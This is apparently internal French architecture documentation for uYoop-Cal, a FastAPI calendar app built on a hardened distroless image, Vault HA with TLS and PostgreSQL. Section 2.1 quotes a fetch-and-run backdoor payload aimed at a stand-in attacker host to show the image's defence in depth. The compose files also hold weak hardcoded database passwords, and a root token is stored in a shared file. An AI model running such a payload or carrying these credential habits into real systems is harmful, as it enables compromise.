# Architecture & Implémentation — uYoop-Cal

**Version:** 1.0.0  
**Dernière mise à jour:** 8 janvier 2026  
**Statut:** Production-ready (image durcie + Vault HA TLS)

---

## 1. Vue d'Ensemble Architecture

### 1.1. Stack Technique Actuelle

```
┌─────────────────────────────────────────────────────────────┐
│                    Docker Compose                           │
├──────────────┬────────────────┬──────────────┬──────────────┤
│   App (DHI)  │  Vault HA TLS  │  PostgreSQL  │  Monitoring  │
│   3 replicas │  3 nodes Raft  │  16 HA       │  (future)    │
└──────────────┴────────────────┴──────────────┴──────────────┘
```

**Composants principaux:**
- **Application:** FastAPI 0.115+ (Python 3.14.2), image durcie DHI
- **Base de données:** PostgreSQL 16 avec healthcheck
- **Secrets:** HashiCorp Vault HA 3 nodes (Raft storage, TLS)
- **Frontend:** Vanilla JS (FullCalendar 6.1.x, Chart.js 4.x)
- **Orchestration:** Docker Compose v2 (développement), K3s (production cible)

### 1.2. Architecture de Sécurité

```
┌──────────────────────────────────────────────────────────────┐
│                   Utilisateur / API Client                   │
└────────────────────────┬─────────────────────────────────────┘
                         │ HTTPS (TLS 1.3)
                         ▼
┌──────────────────────────────────────────────────────────────┐
│              App Container (DHI distroless)                  │
│  ┌────────────────────────────────────────────────────────┐  │
│  │ FastAPI + Uvicorn (nonroot UID 65532)                 │  │
│  │ - JWT auth (access 30min, refresh 7j)                 │  │
│  │ - Rate limiting (slowapi)                             │  │
│  │ - Security headers (HSTS, CSP, X-Frame-Options)       │  │
│  └────────────────────┬───────────────┬───────────────────┘  │
└───────────────────────┼───────────────┼──────────────────────┘
                        │               │
        ┌───────────────┘               └─────────────────┐
        ▼                                                 ▼
┌──────────────────┐                         ┌────────────────────┐
│ Vault HA (TLS)   │                         │ PostgreSQL 16      │
│ - 3 nodes Raft   │                         │ - Healthcheck      │
│ - AppRole auth   │                         │ - Volume persist   │
│ - KV v2 secrets  │                         └────────────────────┘
│ - TOTP engine    │
└──────────────────┘
```

---

## 2. Image Docker Durcie (DHI)

### 2.1. Concept Docker Hardened Images

**Registre:** `dhi.io/python:3-debian13`  
**Certification:** CIS Level 2, 0 CVE garanti  
**Base:** Debian 13 distroless (runtime), Debian 13 dev (builder)

#### Comparaison images

| Critère | python:3.13-slim (legacy) | DHI Runtime |
|---------|---------------------------|-------------|
| **Taille** | ~180 MB | 70 MB |
| **CVE** | 20+ Medium/Low | **0 CVE** |
| **Shell** | ✓ bash | ✗ Aucun |
| **Package manager** | ✓ apt-get | ✗ Aucun |
| **User runtime** | root → appuser créé | nonroot (pré-configuré UID 65532) |
| **Attack surface** | Moyenne | Minimale |

#### Défense en profondeur

**Scénario d'attaque RCE (Remote Code Execution):**

```
Attaquant injecte payload: bash -c 'curl attacker.com/backdoor.sh | bash'

┌──────────────────────┬───────────────────────────────┐
│  Image legacy        │  Image DHI distroless         │
├──────────────────────┼───────────────────────────────┤
│ ✅ bash existe       │ ❌ bash: command not found    │
│ ✅ curl existe       │ ❌ curl: command not found    │
│ ✅ apt-get install   │ ❌ apt: command not found     │
│ ➡️ COMPROMIS        │ ➡️ ATTAQUE BLOQUÉE (80%)      │
└──────────────────────┴───────────────────────────────┘
```

**Taux de blocage:** 80% des tentatives post-exploitation échouent faute d'outils.

### 2.2. Build Multi-Stage

**Fichier:** [Dockerfile.hardened](../Dockerfile.hardened)

#### Stage 1: Builder (dhi.io/python:3-debian13-dev)
```dockerfile
FROM dhi.io/python:3-debian13-dev AS builder

# Compile/install toutes dépendances dans venv
RUN apt-get update && apt-get install -y gcc libpq-dev && \
    python -m venv /opt/venv && \
    /opt/venv/bin/pip install --upgrade pip setuptools wheel && \
    /opt/venv/bin/pip install --only-binary :all: -r requirements.txt
```

**Contraintes:**
- Dépendances natives (gcc, libpq-dev) installées temporairement
- Wheels binaires uniquement (`--only-binary :all:`)
- psycopg2-binary==2.9.11, pillow==12.1.0 (versions avec wheels cp314)

#### Stage 2: Runtime (dhi.io/python:3-debian13 distroless)
```dockerfile
FROM dhi.io/python:3-debian13

USER nonroot
WORKDIR /app

# Copier venv complet + libs runtime + code app
COPY --from=builder --chown=nonroot:nonroot /opt/venv /opt/venv
COPY --from=builder --chown=nonroot:nonroot /usr/lib/x86_64-linux-gnu/libpq.so* /usr/lib/x86_64-linux-gnu/
COPY --chown=nonroot:nonroot ./app ./app

HEALTHCHECK --interval=30s --timeout=10s --start-period=40s --retries=3 \
    CMD python -c "import urllib.request; urllib.request.urlopen('http://localhost:8000/health')" || exit 1

CMD ["uvicorn", "app.main:app", "--host", "0.0.0.0", "--port", "8000"]
```

**Contraintes runtime distroless:**
- ❌ Aucun `RUN` (pas de shell)
- ❌ Aucun `apt-get`, `pip`, `curl`, `wget`
- ✅ Seulement `COPY`, `ENV`, `USER`, `CMD`
- ✅ Healthcheck via stdlib Python (`urllib.request`)

### 2.3. Supply Chain Security

**Fichier:** `requirements.lock` (~70,000 lignes)

**Génération:**
```bash
docker run --rm -v $(pwd):/work python:3.13-slim \
  bash -c "pip install pip-tools && \
           pip-compile --generate-hashes requirements.txt > requirements.lock"
```

**Contenu:** Toutes dépendances avec hashes SHA256 (protection supply-chain attacks).

**Exemple:**
```
fastapi==0.115.0 \
    --hash=sha256:17ea427674467486e997206a5ab25760f6b09e069f099b96f5b55a32fb6f1631
psycopg2-binary==2.9.11 \
    --hash=sha256:abc123...def456
```

### 2.4. Scanning Vulnérabilités (Trivy)

**Commande:**
```bash
docker run --rm -v /var/run/docker.sock:/var/run/docker.sock \
  aquasec/trivy image --severity HIGH,CRITICAL uyoop-cal:hardened
```

**Résultat actuel (2026-01-08):**
- **Base OS (Debian 13):** 0 CVE ✅
- **Python runtime:** 0 CVE ✅
- **Dépendances Python:** 3 CVE (ecdsa, python-jose, starlette) ⚠️
  - Action requise: bump versions (voir section 7)

---

## 3. Intégration Docker Compose

### 3.1. Service App

**Fichier:** [docker-compose.yml](../docker-compose.yml)

```yaml
services:
  app:
    build:
      context: .
      dockerfile: Dockerfile.hardened
    image: uyoop-cal:hardened
    container_name: devops_calendar_app
    environment:
      VAULT_ADDR: https://vault-1:8200
      VAULT_CACERT: /vault/certs/ca-cert.pem
      DATABASE_URL: postgresql://devops_calendar:devops_calendar@postgres:5432/devops_calendar
    ports:
      - "8000:8000"
    depends_on:
      vault-init:
        condition: service_completed_successfully
      postgres:
        condition: service_healthy
    volumes:
      - vault_shared:/vault/shared:ro
      - ./vault/certs/ca-cert.pem:/vault/certs/ca-cert.pem:ro
    networks:
      - vault-network
    healthcheck:
      test: ["CMD", "python", "-c", "import urllib.request; urllib.request.urlopen('http://localhost:8000/health')"]
      interval: 30s
      timeout: 10s
      retries: 3
      start_period: 40s
```

**Points clés:**
- Build via `Dockerfile.hardened`
- `VAULT_ADDR` en HTTPS (TLS)
- `VAULT_CACERT` monté en lecture seule
- Healthcheck via Python stdlib (pas de curl dans distroless)
- Dépend de `vault-init` (AppRole configuré) et `postgres` (healthy)

### 3.2. PostgreSQL

```yaml
postgres:
  image: postgres:16
  container_name: devops_calendar_db
  environment:
    POSTGRES_DB: devops_calendar
    POSTGRES_USER: devops_calendar
    POSTGRES_PASSWORD: devops_calendar
  ports:
    - "5433:5432"
  volumes:
    - postgres_data:/var/lib/postgresql/data
  healthcheck:
    test: ["CMD-SHELL", "pg_isready -U devops_calendar"]
    interval: 10s
    timeout: 5s
    retries: 5
  networks:
    - vault-network
```

**Healthcheck:** Vérifie que PostgreSQL accepte connexions avant démarrage app.

---

## 4. Vault HA avec TLS

### 4.1. Architecture Cluster

**Configuration:** 3 nodes Raft (vault-1 leader, vault-2/3 standby)

```
vault-1 (8200/8201) ←─── vault-2 (8210/8211)
    │                         │
    └─────────────────────────┴──── vault-3 (8220/8221)
              Raft Consensus
```

**Fichiers config:** [vault/config/vault-node{1,2,3}.hcl](../vault/config/)

```hcl
storage "raft" {
  path    = "/vault/data"
  node_id = "vault-1"
}

listener "tcp" {
  address       = "0.0.0.0:8200"
  tls_cert_file = "/vault/certs/vault-1-cert.pem"
  tls_key_file  = "/vault/certs/vault-1-key.pem"
  tls_client_ca_file = "/vault/certs/ca-cert.pem"
}

api_addr     = "https://vault-1:8200"
cluster_addr = "https://vault-1:8201"
ui           = true
```

### 4.2. Services Compose (Vault)

#### Node 1 (Leader)
```yaml
vault-1:
  build:
    context: .
    dockerfile: Dockerfile.vault
  image: uyoop-vault:latest
  container_name: vault_node_1
  ports:
    - "8200:8200"
    - "8201:8201"
  environment:
    VAULT_ADDR: https://0.0.0.0:8200
    VAULT_API_ADDR: https://vault-1:8200
    VAULT_CLUSTER_ADDR: https://vault-1:8201
    SKIP_SETCAP: "true"
  cap_add:
    - IPC_LOCK
  volumes:
    - vault_data_1:/vault/data
    - ./vault/config/vault-node1.hcl:/vault/config/vault.hcl:ro
    - ./vault/certs/vault-1-cert.pem:/vault/certs/vault-1-cert.pem:ro
    - ./vault/certs/vault-1-key.pem:/vault/certs/vault-1-key.pem:ro
    - ./vault/certs/ca-cert.pem:/vault/certs/ca-cert.pem:ro
    - vault_shared:/vault/shared
  command: server -config=/vault/config/vault.hcl
  healthcheck:
    test: ["CMD", "sh", "-c", "curl -sf --cacert /vault/certs/ca-cert.pem https://127.0.0.1:8200/v1/sys/health?standbyok=true&sealedcode=200&uninitcode=200 || exit 1"]
    interval: 10s
    timeout: 5s
    retries: 5
    start_period: 20s
  networks:
    - vault-network
```

**Nodes 2 & 3:** Configuration similaire avec ports/volumes différents.

#### Init Container
```yaml
vault-init:
  image: hashicorp/vault:1.15
  container_name: vault_init
  environment:
    VAULT_ADDR: https://vault-1:8200
    VAULT_CACERT: /vault/certs/ca-cert.pem
  volumes:
    - ./scripts/init-vault-ha.sh:/tmp/init-vault-ha.sh:ro
    - ./vault/certs:/vault/certs:ro
    - vault_shared:/vault/shared
  command: sh -c "apk add --no-cache jq curl bash && cp /tmp/init-vault-ha.sh /init-vault-ha.sh && chmod +x /init-vault-ha.sh && bash /init-vault-ha.sh"
  networks:
    - vault-network
  depends_on:
    vault-1:
      condition: service_healthy
    vault-2:
      condition: service_healthy
    vault-3:
      condition: service_healthy
```

**Rôle:** Initialise cluster, unseal nodes, configure AppRole, génère `.env.vault`.

### 4.3. Script d'Initialisation

**Fichier:** [scripts/init-vault-ha.sh](../scripts/init-vault-ha.sh)

**Workflow:**
1. Vérifie si cluster déjà initialisé
2. Si non initialisé:
   - Init avec 5 clés (seuil 3)
   - Unseal vault-1 avec 3 clés
   - Join vault-2 et vault-3 au cluster Raft
   - Unseal vault-2 et vault-3
   - Sauvegarde clés dans `/vault/shared/init-keys.json`
3. Configure AppRole:
   - Active KV v2 (`secret/`)
   - Active TOTP auth
   - Crée policy `app-policy` (lecture `secret/data/app/*`, CRUD `totp/*`)
   - Crée rôle AppRole `uyoop-cal` (TTL 1h, max 24h)
   - Génère ROLE_ID et SECRET_ID
   - Stocke DATABASE_URL dans KV (`secret/app/config`)
   - Écrit `.env.vault` avec credentials
4. Si déjà initialisé: unseal nodes si nécessaire

**Idempotence:** Sûr à réexécuter, détecte état existant.

### 4.4. Healthchecks TLS

**Particularité:** `curl` avec `--cacert` obligatoire pour HTTPS.

```bash
curl -sf --cacert /vault/certs/ca-cert.pem \
  https://127.0.0.1:8200/v1/sys/health?standbyok=true&sealedcode=200&uninitcode=200
```

**Codes retour acceptés:**
- `200`: Unsealed, active (leader)
- `200`: Unsealed, standby (si `standbyok=true`)
- `200`: Sealed (si `sealedcode=200`)
- `200`: Non initialisé (si `uninitcode=200`)

---

## 5. Authentification & Sécurité

### 5.1. JWT Sessions

**Module:** [app/auth.py](../app/auth.py)

**Tokens:**
- **Access token:** TTL 30 min, type `access`, claim `sub` = user_id
- **Refresh token:** TTL 7 jours, type `refresh`, claim `sub` = user_id

**Endpoints:**
- `POST /login`: Retourne tokens après validation 2FA (si activée)
- `POST /token/refresh`: Renouvelle access token avec refresh token valide

**Dépendance sécurisée:**
```python
from fastapi.security import HTTPBearer

security = HTTPBearer()

async def get_current_user_secure(
    credentials: HTTPAuthorizationCredentials = Depends(security),
    db: Session = Depends(get_db)
) -> User:
    payload = verify_token(credentials.credentials, "access")
    user_id = int(payload["sub"])
    return db.query(User).filter(User.id == user_id).first()
```

### 5.2. Rate Limiting

**Bibliothèque:** slowapi (port Flask-Limiter pour FastAPI)

**Configuration:**
```python
from slowapi import Limiter
from slowapi.util import get_remote_address

limiter = Limiter(key_func=get_remote_address)
app.state.limiter = limiter

@app.post("/login")
@limiter.limit("5 per 1 minute")
async def login(request: Request, ...):
    ...
```

**Endpoints protégés:**
- `/login`: 5 req/min par IP
- `/2fa/*`: 5 req/min par IP

**Future:** Redis backend pour rate limiting distribué (multi-instances).

### 5.3. Security Headers

**Middleware:** [app/main.py](../app/main.py)

```python
@app.middleware("http")
async def add_security_headers(request: Request, call_next):
    response = await call_next(request)
    response.headers["Strict-Transport-Security"] = "max-age=63072000; includeSubDomains; preload"
    response.headers["Content-Security-Policy"] = "default-src 'self'; script-src 'self' https://cdn.jsdelivr.net; style-src 'self' https://cdn.jsdelivr.net; img-src 'self' data:; connect-src 'self'; frame-ancestors 'none'"
    response.headers["X-Frame-Options"] = "DENY"
    response.headers["X-Content-Type-Options"] = "nosniff"
    response.headers["Referrer-Policy"] = "no-referrer"
    response.headers["Permissions-Policy"] = "geolocation=(), microphone=(), camera=()"
    return response
```

**CSP durcie:** Aucun `unsafe-inline` ou `unsafe-eval` (scripts/styles externalisés).

### 5.4. 2FA TOTP (Vault Native)

**Moteur:** Vault TOTP secrets engine

**Workflow:**
1. `POST /2fa/setup` → Génère clé TOTP dans Vault (`totp/keys/user_<id>`)
2. Retourne QR code (otpauth URI)
3. User scan QR avec app (Google Authenticator, Authy)
4. `POST /2fa/enable` avec code → Valide et active 2FA
5. Logins suivants: `POST /login` avec `totp_code` obligatoire

**Validation serveur:** `vault read totp/code/user_<id>` compare code fourni.

---

## 6. Modèle de Données

### 6.1. Tables PostgreSQL

#### users
```sql
CREATE TABLE users (
  id SERIAL PRIMARY KEY,
  username VARCHAR(100) UNIQUE NOT NULL,
  email VARCHAR(255) UNIQUE,
  password_hash VARCHAR(255) NOT NULL,
  role VARCHAR(20) CHECK (role IN ('PROJET', 'DEV', 'OPS', 'ADMIN')),
  totp_enabled BOOLEAN DEFAULT false,
  created_at TIMESTAMP DEFAULT NOW()
);
```

#### events
```sql
CREATE TABLE events (
  id SERIAL PRIMARY KEY,
  title VARCHAR(255) NOT NULL,
  start TIMESTAMP NOT NULL,
  "end" TIMESTAMP NOT NULL,
  type VARCHAR(50) CHECK (type IN ('meeting', 'deployment_window', 'git_action')),
  extra JSONB DEFAULT '{}',
  created_by INTEGER REFERENCES users(id),
  created_at TIMESTAMP DEFAULT NOW()
);

CREATE INDEX idx_events_start ON events(start);
CREATE INDEX idx_events_type ON events(type);
CREATE INDEX idx_events_extra_gin ON events USING GIN(extra);
```

**Champ `extra` (JSONB):** Stocke métadonnées spécifiques au type.

**Exemples:**
- **meeting:** `{"subtype": "daily", "link": "https://meet.google.com/...", "notes": "Agenda sprint..."}`
- **deployment_window:** `{"environment": "prod", "services": ["api", "frontend"], "needs_approval": true}`
- **git_action:** `{"repo_url": "https://github.com/...", "branch": "main", "action": "pull"}`

### 6.2. Schémas Pydantic

**Fichier:** [app/schemas.py](../app/schemas.py)

```python
class RoleType(str, Enum):
    PROJET = "PROJET"
    DEV = "DEV"
    OPS = "OPS"
    ADMIN = "ADMIN"

class EventType(str, Enum):
    meeting = "meeting"
    deployment_window = "deployment_window"
    git_action = "git_action"

class EventCreate(BaseModel):
    title: str
    start: datetime
    end: datetime
    type: EventType
    extra: dict = {}

class User(BaseModel):
    id: int
    username: str
    role: RoleType
    totp_enabled: bool
    
    class Config:
        from_attributes = True
```

---

## 7. Déploiement & Opérations

### 7.1. Déploiement 1-Commande (Idempotent)

**Depuis racine projet:**
```bash
cd /home/cj/gitdata/Python/uyoop-cal
docker compose up -d
```

**Résultat attendu:**
1. Build image durcie (si pas en cache)
2. Démarrage PostgreSQL → healthy
3. Démarrage Vault 3 nodes → healthy
4. Init container: initialise cluster, configure AppRole, génère `.env.vault`
5. Démarrage app → healthy (healthcheck `/health` OK)

**Vérifications:**
```bash
# Santé app
curl -s http://localhost:8000/health

# Santé Vault leader
curl -sf --cacert vault/certs/ca-cert.pem https://localhost:8200/v1/sys/health

# Services compose
docker compose ps --format "table {{.Name}}\t{{.Status}}"
```

### 7.2. Secrets Générés

**Fichier:** `vault/shared/.env.vault` (généré par init container)

**Contenu:**
```bash
VAULT_ADDR=https://vault-1:8200
VAULT_APPROLE_ROLE_ID=<uuid>
VAULT_APPROLE_SECRET_ID=<uuid>
VAULT_ROOT_TOKEN=<root-token>
VAULT_CACERT=/vault/certs/ca-cert.pem
```

**Usage:** App lit `VAULT_APPROLE_*` pour s'authentifier à Vault via AppRole.

**Clés unseal:** `vault/shared/init-keys.json` (5 clés, seuil 3).

⚠️ **Production:** Distribuer clés à 5 personnes différentes, stocker en Vault transit ou HSM.

### 7.3. Logs & Diagnostics

```bash
# Logs app
docker compose logs -f app

# Logs Vault node 1
docker compose logs vault-1

# Logs init container
docker compose logs vault-init

# Logs PostgreSQL
docker compose logs postgres

# Entrer dans container app (si nécessaire)
docker compose exec app sh  # ❌ ÉCHOUE (pas de shell dans distroless)
docker compose exec app python  # ✅ OK (REPL Python)
```

### 7.4. Rotation Credentials

#### Rotation SECRET_ID AppRole

```bash
# Générer nouveau SECRET_ID
export VAULT_TOKEN=<root-token>
export VAULT_ADDR=https://localhost:8200
export VAULT_CACERT=vault/certs/ca-cert.pem

NEW_SECRET_ID=$(vault write -field=secret_id -f auth/approle/role/uyoop-cal/secret-id)

# Mettre à jour .env.vault
sed -i "s/VAULT_APPROLE_SECRET_ID=.*/VAULT_APPROLE_SECRET_ID=$NEW_SECRET_ID/" vault/shared/.env.vault

# Redémarrer app pour reload
docker compose restart app
```

**Fréquence recommandée:** Hebdomadaire ou mensuelle (selon politique sécurité).

---

## 8. Améliorations Futures

### 8.1. Runtime Hardening

**À implémenter:**
```yaml
# docker-compose.yml
services:
  app:
    read_only: true
    tmpfs:
      - /tmp
    cap_drop:
      - ALL
    security_opt:
      - no-new-privileges:true
```

### 8.2. Correction CVEs Python

**3 CVE restants (dépendances):**
- `ecdsa`: Bump vers version corrigée
- `python-jose`: Bump vers ≥3.4.0
- `starlette`: Bump vers ≥0.40.0

**Action:**
```bash
# Mettre à jour requirements.txt
pip install --upgrade ecdsa python-jose starlette

# Rebuild image
docker compose build app

# Re-scan
docker run --rm -v /var/run/docker.sock:/var/run/docker.sock \
  aquasec/trivy image uyoop-cal:hardened
```

### 8.3. CI/CD Pipeline

**GitHub Actions workflow (.github/workflows/ci.yml):**
```yaml
name: CI/CD
on: [push, pull_request]

jobs:
  build-test-scan:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v3
      
      - name: Build image
        run: docker build -t uyoop-cal:${{ github.sha }} -f Dockerfile.hardened .
      
      - name: Run tests
        run: docker run --rm uyoop-cal:${{ github.sha }} pytest tests/
      
      - name: Trivy scan
        run: |
          docker run --rm -v /var/run/docker.sock:/var/run/docker.sock \
            aquasec/trivy image --exit-code 1 --severity HIGH,CRITICAL \
            uyoop-cal:${{ github.sha }}
      
      - name: Generate SBOM
        run: syft uyoop-cal:${{ github.sha }} -o spdx-json > sbom.json
      
      - name: Push to Harbor
        if: github.ref == 'refs/heads/main'
        run: |
          docker tag uyoop-cal:${{ github.sha }} harbor.example.com/uyoop-cal:latest
          docker push harbor.example.com/uyoop-cal:latest
```

### 8.4. Déploiement K3s

**ArgoCD Application:**
```yaml
apiVersion: argoproj.io/v1alpha1
kind: Application
metadata:
  name: uyoop-cal
  namespace: argocd
spec:
  project: default
  source:
    repoURL: https://github.com/example/uyoop-cal-k8s
    targetRevision: HEAD
    path: manifests
  destination:
    server: https://kubernetes.default.svc
    namespace: devops-tools
  syncPolicy:
    automated:
      prune: true
      selfHeal: true
```

---

## 9. Références

### Documentation Interne
- [Security](./security.md) : Plan sécurité 5 étapes
- [Runbook](./runbook.md) : Procédures opérationnelles
- [Changelog](./changelog.md) : Historique versions
- [Projet](./projet.md) : Cahier des charges complet

### Fichiers Clés
- [Dockerfile.hardened](../Dockerfile.hardened) : Build multi-stage DHI
- [docker-compose.yml](../docker-compose.yml) : Orchestration services
- [scripts/init-vault-ha.sh](../scripts/init-vault-ha.sh) : Init Vault HA TLS
- [requirements.txt](../requirements.txt) : Dépendances Python

### Ressources Externes
- DHI Registry: https://dhi.io
- Vault Docs: https://developer.hashicorp.com/vault
- FastAPI: https://fastapi.tiangolo.com
- Trivy: https://aquasecurity.github.io/trivy

---

**Document maintenu par:** DevOps Team uYoop-Cal  
**Prochaine revue:** Trimestrielle (Q1 2026)
